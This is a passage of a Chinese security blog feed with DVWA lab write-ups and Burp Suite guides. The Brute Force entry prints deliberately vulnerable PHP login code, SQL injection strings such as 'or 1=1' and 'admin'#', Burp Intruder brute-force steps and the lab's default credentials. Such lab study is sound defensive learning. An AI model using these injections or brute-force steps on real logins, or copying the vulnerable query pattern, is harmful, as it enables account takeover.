&apos;first_name&apos; ];$last = $row[ &apos;last_name&apos; ];// Feedback for end userecho &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;&#125;&#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 添加了token机制，防止CSRF攻击。SQL语句使用PDO机制预处理语句PHP PDO 预处理语句与存储过程 原理：两次传输，前一次传一个sql模板，第二次传查询参数，会把第二步传入的参数只做查询参数处理，不做语义解释，这样注入的条件就算执行了，也不会得到查询结果。划清了代码与数据的界限，可以确保不会发生SQL 注入。（然而，如果查询的其他部分是由未转义的输入来构建的，则仍存在 SQL 注入的风险）。 介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>CTF</category>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA学习（二）Brute Force]]></title>
    <url>%2F2018%2F05%2F06%2FDVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89Brute-Force%2F</url>
    <content type="text"><![CDATA[引言DVWA学习（二）Brute Force（暴力破解模块） 简介暴力破解一般指穷举法，穷举法的基本思想是根据题目的部分条件确定答案的大致范围，并在此范围内对所有可能的情况逐一验证，直到全部情况验证完毕。若某个情况验证符合题目的全部条件，则为本问题的一个解；若全部情况验证后都不符合题目的全部条件，则本题无解。穷举法也称为枚举法。 Burp Intruder模块1.Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。 原理：Intruder在原始请求数据的基础上，通过修改各种请求参数，以获取不同的请求应答。每一次请求中，Intruder通常会携带一个或多个有效攻击载荷（Payload),在不同的位置进行攻击重放，通过应答数据的比对分析来获得需要的特征数据。Burp Intruder通常被使用在以下场景： ●标识符枚举 Web应用程序经常使用标识符来引用用户、账户、资产等数据信息。例如，用户名，文件ID和账户号码。●提取有用的数据 在某些场景下，而不是简单地识别有效标识符，你需要通过简单标识符提取一些其他的数据。比如说，你想通过用户的个人空间id，获取所有用户在个人空间标准的昵称和年龄。●模糊测试 很多输入型的漏洞，如SQL注入，跨站点脚本和文件路径遍历可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。由于的应用程序的大小和复杂性，手动执行这个测试是一个耗时且繁琐的过程。这样的场景，您可以设置Payload，通过Burp Intruder自动化地对Web应用程序进行模糊测试。 2.Burp Intruder主要有四个模块组成: ●：Target 用于配置目标服务器进行攻击的详细信息。●：Positions 设置Payloads的插入点以及攻击类型（攻击模式）。●：Payloads 设置payload，配置字典●：Opetions 此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。 Target 目标选项(Target tab) Positions 位置选项(Positions tab) 这个选项是用来配置在攻击里产生的所有 HTTP 请求的模板： Burp Suite Intruder的4种攻击类型 Payloads 有效负荷选项(Payloads tab) 选项1：Payload Sets Payload数量类型设置 选项2：Payload Opetions[Simple list] 该选项会根据选项1中Payload type的设置而改变 选项3：Payload Processing 对生成的Payload进行编码、加密、截取等操作 选项4：Payload Encoding 你可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输。任何已配置的URL编码最后应用，任何有效载荷处理规则执行之后。 这是推荐使用此设置进行最终URL编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的grep选项来检查响应为呼应有效载荷的最终URL编码应用之前。 Opetions 选项卡(Options tab) 选项1：Request Headers 这些设置控制在Intruder是否更新配置请求头。 如果选中‘update Content-Length header’框，Burp Intruder 会使用每个请求的 HTTP 主体长度的正确值，添加或更新这个请求里 HTTP 消息头的内容长度。这个功能对一些需要把可变长度的有效载荷插入到 HTTP 请求模板主体的攻击是很有必要的。这个 HTTP 规范和大多数 web 服务器一样，需要使用消息头内容长度来指定 HTTP 主体长度的正确值。如果没有指定正确值，目标服务器会返回一个错误，也可能返回一个未完成的请求，也可能无限期地等待接收请求里的进一步数据。 如果选中‘set Connection: close’框，则 Burp Intruder 会添加或更新 HTTP 消息头的连接来请求在每个请求后已关闭的连接。在多数情况下，这个选项会让攻击执行得更快。 选项2：Request Engine 设置发送请求的线程、超时重试等。 选项3：Attack Results 设置攻击结果的显示。 选项4：Grep - Match Grep Match——这个设置主要用来从响应消息中提取结果项，如果匹配，则在攻击结果中添加的新列中标明，便于排序和数据提取。比如说，在密码猜测攻击，扫描诸如“密码不正确”或“登录成功”，可以找到成功的登录;在测试SQL注入漏洞，扫描包含“ODBC”，“错误”等消息可以识别脆弱的参数 选项5：Grep Extract——这些设置可用于提取响应消息中的有用信息。对于列表中配置的每个项目，Burp会增加包含提取该项目的文本的新结果列。然后，您可以排序此列（通过单击列标题）命令所提取的数据。此选项是从应用数据挖掘有用的，能够支持广泛的攻击。例如，如果你是通过一系列文档ID的循环，可以提取每个文档寻找有趣的项目的页面标题。如果您发现返回的其他应用程序用户详细信息的功能，可以通过用户ID重复和检索有关用户寻找管理帐户，甚至密码。如果“遗忘密码”的功能需要一个用户名作为参数，并返回一个用户配置的密码提示，您可以通过共同的用户名列表运行和收获的所有相关密码的提示，然后直观地浏览列表寻找容易被猜到密码。 选项6：Grep Payloads——这些设置可用于提取响应消息中是否包含Payload的值，比如说，你想验证反射性的XSS脚本是否成功，可以通过此设置此项。当此项设置后，会在响应的结果列表中，根据Payload组的数目，添加新的列，显示匹配的结果，你可以通过点击列标题对结果集进行排序和查找。 选项7：Redirections 重定向响应，重定向（Redirections）——这些设置主要是用来控制执行攻击时Burp如何处理重定向，在实际使用中往往是必须遵循重定向，才能实现你的攻击目的。例如，在密码猜测攻击，每次尝试的结果可能是密码错误会重定向响应到一个错误消息提示页面，如果密码正确会重定向到用户中心的首页。 但设置了重定向也可能会遇到其他的问题，比如说，在某些情况下，应用程序存储您的会话中初始请求的结果，并提供重定向响应时检索此值，这时可能有必要在重定向时只使用一个单线程攻击。也可能会遇到，当你设置重定向，应用程序响应会重定向到注销页面，这时候，按照重定向可能会导致您的会话被终止时. 参考：BurpSuite系列(五)—-Intruder模块(暴力破解) Brute Force（暴力破解）LOW等级查看源码1234567891011121314151617181920212223242526272829303132&lt;?phpif( isset( $_GET[ &apos;Login&apos; ] ) ) &#123;// Get username$user = $_GET[ &apos;username&apos; ];// Get password$pass = $_GET[ &apos;password&apos; ];$pass = md5( $pass );// Check the database$query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;// Get users details$row = mysqli_fetch_assoc( $result );$avatar = $row[&quot;avatar&quot;];// Login successfulecho &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;&#125;else &#123;// Login failedecho &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;&#125;((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 很明显没有任何过滤，存在SQL注入，因为mysqli_num_rows( $result ) == 1，所以产生的结果数必须为1条,而且密码经过了md5加密，是不可控的，所以只能在username上构造语句:SELECT * FROM ‘users’ WHERE user = ‘1’ or 1=1 limit 0,1#’ AND password = ‘随意填’; 当然如果你知道一个用户名为admin的话，也可以构造：1SELECT * FROM &apos;users&apos; WHERE user = &apos;admin&apos;#&apos; AND password = &apos;$pass&apos;; 上面是SQL注入，可是这道题是让暴力破解的，第二种方法：Burp抓包发送到Intruder模块，假设已知管理员用户名admin，需要对password暴破，把password的参数设置为需要破解的变量，只有一个类型使用狙击手模式即可。 简单模式，配置字典，也可以加载外部字典 也可以设置从响应消息中提取结果 根据Welcome为对号或者Length不同找到正确的密码 Medium等级源码1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_GET[ &apos;Login&apos; ] ) ) &#123;// Sanitise username input$user = $_GET[ &apos;username&apos; ];$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));// Sanitise password input$pass = $_GET[ &apos;password&apos; ];$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));$pass = md5( $pass );// Check the database$query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;// Get users details$row = mysqli_fetch_assoc( $result );$avatar = $row[&quot;avatar&quot;];// Login successfulecho &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;&#125;else &#123;// Login failedsleep( 2 );echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;&#125;((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 跟LOW相比，username和password经过了mysqli_real_escape_string()函数过滤，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义，实验环境为MySQL5.7.21，所以无法进行SQL注入。以及如果密码错误的话会sleep( 2 )，每一次的请求包响应时间由毫秒基本变成了2~10秒。这样大大的增加了我们破解出密码锁需要的时间。步骤与LOW模式一致。这里就当作不知道用户名和密码，添加两个字典用集束炸弹模式用笛卡儿积的方式同时暴破两个参数： 设置payload1，2对应的用户名密码字典 同样在响应头提取welcome 等待筛选到的welcome即可 High等级源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102&lt;?phpif( isset( $_POST[ &apos;Login&apos; ] ) &amp;&amp; isset ($_POST[&apos;username&apos;]) &amp;&amp; isset ($_POST[&apos;password&apos;]) ) &#123;// Check Anti-CSRF tokencheckToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );// Sanitise username input$user = $_POST[ &apos;username&apos; ];$user = stripslashes( $user );$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));// Sanitise password input$pass = $_POST[ &apos;password&apos; ];$pass = stripslashes( $pass );$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));$pass = md5( $pass );// Default values$total_failed_login = 3;$lockout_time = 15;$account_locked = false;// Check the database (Check user information)$data = $db-&gt;prepare( &apos;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&apos; );$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );$data-&gt;execute();$row = $data-&gt;fetch();// Check to see if the user has been locked out.if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &apos;failed_login&apos; ] &gt;= $total_failed_login ) ) &#123;// User locked out. Note, using this method would allow for user enumeration!//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;// Calculate when the user would be allowed to login again$last_login = strtotime( $row[ &apos;last_login&apos; ] );$timeout = $last_login + ($lockout_time * 60);$timenow = time();/*print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;*/// Check to see if enough time has passed, if it hasn&apos;t locked the accountif( $timenow &lt; $timeout ) &#123;$account_locked = true;// print &quot;The account is locked&lt;br /&gt;&quot;;&#125;&#125;// Check the database (if username matches the password)$data = $db-&gt;prepare( &apos;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; );$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR);$data-&gt;bindParam( &apos;:password&apos;, $pass, PDO::PARAM_STR );$data-&gt;execute();$row = $data-&gt;fetch();// If its a valid login...if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) &#123;// Get users details$avatar = $row[ &apos;avatar&apos; ];$failed_login = $row[ &apos;failed_login&apos; ];$last_login = $row[ &apos;last_login&apos; ];// Login successfulecho &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;&quot;;echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;// Had the account been locked out since last login?if( $failed_login &gt;= $total_failed_login ) &#123;echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;;&#125;// Reset bad login count$data = $db-&gt;prepare( &apos;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&apos; );$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );$data-&gt;execute();&#125; else &#123;// Login failedsleep( rand( 2, 4 ) );// Give the user some feedbackecho &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;// Update bad login count$data = $db-&gt;prepare( &apos;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&apos; );$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );$data-&gt;execute();&#125;// Set the last login time$data = $db-&gt;prepare( &apos;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&apos; );$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );$data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 可以看到代码中加入了stripslashes()函数对用户名和密码去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个。同时加入了Token，可以抵御CSRF攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：username、password、Login以及user_token。 每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。 由于加入了Anti-CSRFtoken预防无脑爆破，token的值三随机变化的用burp不容易爆破成功。所以需要自己写python脚本html页面中抓取user_token的值然后进行爆破。由于python还没有学，这里先留个坑以后填Impossible级别 源码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;?phpif( isset( $_POST[ &apos;Login&apos; ] ) ) &#123;// Check Anti-CSRF tokencheckToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );// Sanitise username input$user = $_POST[ &apos;username&apos; ];$user = stripslashes( $user );$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));// Sanitise password input$pass = $_POST[ &apos;password&apos; ];$pass = stripslashes( $pass );$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));$pass = md5( $pass );// Default values$total_failed_login = 3;$lockout_time = 15;$account_locked = false;// Check the database (Check user information)$data = $db-&gt;prepare( &apos;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&apos; );$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );$data-&gt;execute();$row = $data-&gt;fetch();// Check to see if the user has been locked out.if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &apos;failed_login&apos; ] &gt;= $total_failed_login ) ) &#123;// User locked out. Note, using this method would allow for user enumeration!//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;// Calculate when the user would be allowed to login again$last_login = strtotime( $row[ &apos;last_login&apos; ] );$timeout = $last_login + ($lockout_time * 60);$timenow = time();/*print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;*/// Check to see if enough time has passed, if it hasn&apos;t locked the accountif( $timenow &lt; $timeout ) &#123;$account_locked = true;// print &quot;The account is locked&lt;br /&gt;&quot;;&#125;&#125;// Check the database (if username matches the password)$data = $db-&gt;prepare( &apos;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; );$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR);$data-&gt;bindParam( &apos;:password&apos;, $pass, PDO::PARAM_STR );$data-&gt;execute();$row = $data-&gt;fetch();// If its a valid login...if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) &#123;// Get users details$avatar = $row[ &apos;avatar&apos; ];$failed_login = $row[ &apos;failed_login&apos; ];$last_login = $row[ &apos;last_login&apos; ];// Login successfulecho &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;&quot;;echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;// Had the account been locked out since last login?if( $failed_login &gt;= $total_failed_login ) &#123;echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;;&#125;// Reset bad login count$data = $db-&gt;prepare( &apos;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&apos; );$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );$data-&gt;execute();&#125; else &#123;// Login failedsleep( rand( 2, 4 ) );// Give the user some feedbackecho &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;// Update bad login count$data = $db-&gt;prepare( &apos;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&apos; );$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );$data-&gt;execute();&#125;// Set the last login time$data = $db-&gt;prepare( &apos;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&apos; );$data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR );$data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 相比于High难度，当输入错误failed_login=3，$last_login + ($lockout_time * 60); 锁定15分钟以及随机sleep(rand(2,4)),防止了爆破。而且在与数据库交互时采用PDO（PHP Data Object，PHP数据对象）机制。因为两次传输，前一次传一个sql模板，第二次传查询参数，会把第二步传入的参数只做查询参数处理，不做语义解释，这样注入的条件就算执行了，也不会得到查询结果。 当调用 prepare() 时，查询语句已经发送给了数据库服务器，此时只有占位符 ? 发送过去，没有用户提交的数据；当调用到 execute()时，用户提交过来的值才会传送给数据库，他们是分开传送的，两者独立的，SQL攻击者没有一点机会。 新手指南：DVWA-1.9全级别教程之Brute Force 介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>CTF</category>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA学习（一）环境搭建]]></title>
    <url>%2F2018%2F05%2F01%2FDVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[引言DVWA学习（一）环境搭建 DVWA简介DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。 DVWA共有十个模块，分别是:1.Brute Force（暴力（破解））2.Command Injection（命令行注入）3.CSRF（跨站请求伪造）4.File Inclusion（文件包含）5.File Upload（文件上传）6.Insecure CAPTCHA （不安全的验证码）7.SQL Injection（SQL注入）8.SQL Injection（Blind）（SQL盲注）9.XSS（Reflected）（反射型跨站脚本）10.XSS（Stored）（存储型跨站脚本） 需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。环境搭建 安装ubuntu-server16.04虚拟机NAT模式。Apache/2.4.18 (Ubuntu)PHP 5.6.35-1+ubuntu16.04.1+deb.sury.org+1 (cli)MySQL5.7.21-0ubuntu0.16.04.1查看虚拟机动态ip 外部主机成功访问虚拟机服务器中的DVWA网站： DVWA默认的用户有5个，用户名密码如下（一个足以）： admin/passwordgordonb/abc1231337/charleypablo/letmeinsmithy/password 数据库中的密码用了md5加密 介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>CTF</category>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BurpSuite系列之User options模块]]></title>
    <url>%2F2018%2F04%2F29%2FBurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BUser-options%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[引言BurpSuite系列之User options模块(用户选择) 简介User options模块主要用来配置一些常用的选项。 模块说明User options主要由4个模块组成:1.Connections 连接2.SSL3.Display4.Misc 杂项 Connections 连接选项1：Platform Authentication选项2：Upstream Proxy Servers 选项3：Socks Proxy SSL选项1：Java SSL Options选项2：Client SSL Certificates Display选项1：User Interface选项2：Http Message Display选项3：Character Sets Misc 杂项选项1：Hotkeys选项2：Logging 选项3：Temporary Files Location选项4：Proxy Interception选项5：Performance Feedback 介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>软件安装与使用</category>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BurpSuite系列之Project options模块]]></title>
    <url>%2F2018%2F04%2F20%2FBurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BProject-options%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[引言BurpSuite系列之Project options模块(项目选择) 简介Project options主要用来对Project的一些设置。 模块说明Project options主要由五个模块组成: 1.Connections 连接2.HTTP3.SSL4.Sessions5.Misc 杂项 Connections 连接选项1：Platform Authentication选项2：Upstream proxy servers选项3：Socks proxy选项4：Timeouts 选项5：Hosname Resolution选项6：Out-of-scope Requests HTTP选项1：Redirections选项2：Streaming responses 选项3：status 100 responses SSL选项1：SSL Negotiation选项2：Client SSL Certificates选项3：Server SSL Certificates Sessions选项1：Session Handling Rules选项2：Cookie Jar 选项3：Macros Misc 杂项选项1：Scheduled Tasks选项2：Burp Collaborator Server 介绍：仅供技术交流学习探讨，请勿用于非法用途,。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>软件安装与使用</category>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BurpSuite系列之Extender模块]]></title>
    <url>%2F2018%2F04%2F16%2FBurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BExtender%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[引言BurpSuite系列之Extender模块(扩展器) 简介Burp在软件中提供了支持第三方拓展插件的功能，方便使用者编写自己的自定义插件或从插件商店中安装拓展插件。Burp扩展程序可以以多种方式支持自定义Burp的行为，例如：修改HTTP请求和响应，自定义UI，添加自定义扫描程序检查以及访问关键运行时信息，包括代理历史记录，目标站点地图和扫描程序问题等。 模块说明Extender主要由四个模块组成: 1.Extensions 扩展2.BApp Store 应用程序商店3.APIS4.Options 选项 Extensions 扩展 日志信息的输出有三种方式：a)系统控制台输出b)存储到指定的文件中c)Burp的界面输出 默认情况下，会选择Burp的界面输出。 BApp Store 应用程序商店 从图中我们可以看出，左边为各个插件的应用列表，当选中某个插件后，右侧显示的为该插件的描述信息和安装信息。 如果我们需要使用某个插件，则点击右侧下方的【install】按钮，进行安装。 此时，安装按钮置为灰色，同时显示为【installing】，右下角也显示安装中，如上图。安装完成后，界面会显示重新安装【Reinstall】和插件评分按钮【Submit rating】，作为插件商店的用户推荐。 安装完毕后，在Burp Extender 的Extension的Tab页面中，会自动显示已加载的插件列表。通过插件列表的管理，我们可以对插件进行后期的维护。 当然，除了从应用商店自动安装插件外，我们也可以下载插件，进行手工安装。如下图： APIS Options 选项 下面还有一个Ruby的环境和上面的差不多。 介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>软件安装与使用</category>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BurpSuite系列之Comparer模块]]></title>
    <url>%2F2018%2F04%2F10%2FBurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BComparer%E6%A8%A1%E5%9D%97%2F</url>
